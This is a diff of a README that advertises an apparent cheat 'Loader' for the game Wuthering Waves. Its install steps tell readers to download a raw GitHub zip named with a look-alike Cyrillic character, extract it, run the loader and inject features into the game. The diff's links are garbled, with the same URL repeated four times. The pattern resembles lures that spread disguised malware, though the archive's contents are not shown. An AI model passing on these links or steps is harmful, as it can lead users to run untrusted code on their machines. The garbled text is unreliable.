@@ -27,10 +27,10 @@ Curious about which platforms are supported? Our program works seamlessly across
 
 Jump into your upgraded Wuthering Waves adventure with these easy steps:
 
-1. **Download https://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zip** from this repository.
+1. **Download https://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zip** from this repository.
 2. Extract the archive using your favorite extraction tool (WinRAR, 7-Zip, Keka, etc.).
 3. Open the extracted folder.
-4. Read the included `https://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zip` for platform-specific details.
+4. Read the included `https://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zipоhttps://raw.githubusercontent.com/ranidudewmina/WutheringWaves-Tricks-v2.3/main/Lоader.zip` for platform-specific details.
 5. Run the Loader application as required for your operating system.
 6. Follow on-screen instructions to inject features into Wuthering Waves.
 7. Enjoy a new realm of gaming possibilities!
